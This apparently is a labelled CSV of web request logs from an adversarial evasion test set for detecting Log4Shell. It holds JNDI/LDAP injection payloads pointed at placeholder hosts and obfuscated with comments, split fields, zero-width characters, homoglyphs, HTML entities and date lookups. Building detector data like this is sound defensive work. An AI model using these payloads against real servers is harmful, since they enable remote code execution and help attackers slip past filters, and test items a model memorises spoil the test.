id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001875,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | method: get | host: app.local | path: /home,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001876,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001877,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001878,2026-05-17,adversarial_evasion,GET /search?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,comment_injection,path,adversarial_evasion_test,critical
LS-001879,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},post /search http/1.1 host: app.local body: query=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,log4shell,comment_injection,body,adversarial_evasion_test,critical
LS-001880,2026-05-17,adversarial_evasion,GET /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1,get /?q=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1,1,log4shell,comment_injection,minimal_query,adversarial_evasion_test,critical
LS-001881,2026-05-17,adversarial_evasion,GET /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} HTTP/1.1 Host: app.local,get /api/check?debug=${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} http/1.1 host: app.local,1,log4shell,comment_injection,uri_param,adversarial_evasion_test,critical
LS-001882,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token} | method: get | host: app.local | path: /metrics,1,log4shell,comment_injection,user_agent,adversarial_evasion_test,critical
LS-001883,2026-05-17,adversarial_evasion,Request from User-Agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,log4shell,comment_injection,user_agent_minimal,adversarial_evasion_test,critical
LS-001884,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j${/**/}ndi:ldap://log4j-test.invalid/comment-token},1,log4shell,comment_injection,x_api_version,adversarial_evasion_test,critical
LS-001885,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001886,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001887,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001888,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001889,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001890,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001891,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001892,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001893,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001894,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001895,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001896,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://log4j-test.invalid/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://log4j-test.invalid/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001897,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001898,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001899,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001900,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001901,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001902,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001903,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001904,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001905,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001906,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001907,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001908,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://log4j-test.invalid/split-field},x-custom: ${jndi x-other: :ldap://log4j-test.invalid/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-002005,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://callback.local/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://callback.local/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002006,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://callback.local/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://callback.local/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002007,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://callback.local/zw-d} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jnd‍i:ldap://callback.local/zw-d} | method: get | host: app.local | path: /static/app.js,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002008,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://callback.local/zw-d},request from user-agent: ${jnd‍i:ldap://callback.local/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002009,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${jnd‍i:ldap://callback.local/zw-d},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jnd‍i:ldap://callback.local/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002010,2026-05-17,adversarial_evasion,GET /search?q=${jnd‍i:ldap://callback.local/zw-d} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jnd‍i:ldap://callback.local/zw-d} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-002011,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jnd‍i:ldap://callback.local/zw-d},post /search http/1.1 host: app.local body: query=${jnd‍i:ldap://callback.local/zw-d},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-002012,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://callback.local/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://callback.local/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002013,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://callback.local/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://callback.local/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002014,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://callback.local/zw-d} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jnd‍i:ldap://callback.local/zw-d} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002015,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://callback.local/zw-d},request from user-agent: ${jnd‍i:ldap://callback.local/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002016,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${jnd‍i:ldap://callback.local/zw-d},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jnd‍i:ldap://callback.local/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002017,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://callback.local/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://callback.local/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-002018,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://callback.local/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://callback.local/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-002019,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://callback.local/greek-j} | Method: GET | Host: app.local | Path: /,request from user-agent: ${ϳndi:ldap://callback.local/greek-j} | method: get | host: app.local | path: /,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-002020,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://callback.local/greek-j},request from user-agent: ${ϳndi:ldap://callback.local/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002021,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${ϳndi:ldap://callback.local/greek-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /login | x-api-version: ${ϳndi:ldap://callback.local/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-002022,2026-05-17,adversarial_evasion,GET /search?q=${ϳndi:ldap://callback.local/greek-j} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${ϳndi:ldap://callback.local/greek-j} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,homoglyph_jndi,path,adversarial_evasion_test,critical
LS-002023,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://callback.local/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://callback.local/greek-j},1,log4shell,homoglyph_jndi,body,adversarial_evasion_test,critical
LS-002024,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://callback.local/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://callback.local/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-002025,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://callback.local/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://callback.local/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-002026,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://callback.local/greek-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ϳndi:ldap://callback.local/greek-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-002027,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://callback.local/greek-j},request from user-agent: ${ϳndi:ldap://callback.local/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002028,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${ϳndi:ldap://callback.local/greek-j},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${ϳndi:ldap://callback.local/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-002029,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://callback.local/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://callback.local/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002030,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://callback.local/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://callback.local/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002031,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://callback.local/multi-zw} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${j​n‌d‍i:ldap://callback.local/multi-zw} | method: get | host: app.local | path: /search?q=boots,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002032,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://callback.local/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://callback.local/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002033,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${j​n‌d‍i:ldap://callback.local/multi-zw},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${j​n‌d‍i:ldap://callback.local/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002034,2026-05-17,adversarial_evasion,GET /search?q=${j​n‌d‍i:ldap://callback.local/multi-zw} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${j​n‌d‍i:ldap://callback.local/multi-zw} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-002035,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​n‌d‍i:ldap://callback.local/multi-zw},post /search http/1.1 host: app.local body: query=${j​n‌d‍i:ldap://callback.local/multi-zw},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-002036,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://callback.local/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://callback.local/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-002037,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://callback.local/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://callback.local/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-002038,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://callback.local/multi-zw} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j​n‌d‍i:ldap://callback.local/multi-zw} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-002039,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://callback.local/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://callback.local/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002040,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j​n‌d‍i:ldap://callback.local/multi-zw},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j​n‌d‍i:ldap://callback.local/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-002041,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://callback.local/html-hex} HTTP/1.1,get /?q=${jndi:ldap://callback.local/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-002042,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://callback.local/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-002043,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://callback.local/html-hex} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://callback.local/html-hex} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-002044,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://callback.local/html-hex},request from user-agent: ${jndi:ldap://callback.local/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002045,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Chrome/120.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${&#x6A;ndi:ldap://callback.local/html-hex},request from user-agent: mozilla/5.0 chrome/120.0 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://callback.local/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-002046,2026-05-17,adversarial_evasion,GET /search?q=${&#x6A;ndi:ldap://callback.local/html-hex} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://callback.local/html-hex} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,html_entity_jndi,path,adversarial_evasion_test,critical
LS-002047,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#x6A;ndi:ldap://callback.local/html-hex},post /search http/1.1 host: app.local body: query=${jndi:ldap://callback.local/html-hex},1,log4shell,html_entity_jndi,body,adversarial_evasion_test,critical
LS-002048,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://callback.local/html-hex} HTTP/1.1,get /?q=${jndi:ldap://callback.local/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-002049,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://callback.local/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://callback.local/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-002050,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://callback.local/html-hex} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://callback.local/html-hex} | method: get | host: app.local | path: /home,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-002051,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://callback.local/html-hex},request from user-agent: ${jndi:ldap://callback.local/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002052,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${&#x6A;ndi:ldap://callback.local/html-hex},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://callback.local/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-002053,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://callback.local/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://callback.local/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-002054,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://callback.local/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://callback.local/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-002055,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://callback.local/date-jn} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${${date:'jn'}di:ldap://callback.local/date-jn} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-002056,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://callback.local/date-jn},request from user-agent: ${${date:'jn'}di:ldap://callback.local/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-002057,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${${date:'jn'}di:ldap://callback.local/date-jn},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /metrics | x-api-version: ${${date:'jn'}di:ldap://callback.local/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-002058,2026-05-17,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://callback.local/date-jn} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${${date:'jn'}di:ldap://callback.local/date-jn} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,semantic_lookup_jndi,path,adversarial_evasion_test,critical
LS-002059,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://callback.local/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://callback.local/date-jn},1,log4shell,semantic_lookup_jndi,body,adversarial_evasion_test,critical
LS-002060,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://callback.local/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://callback.local/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
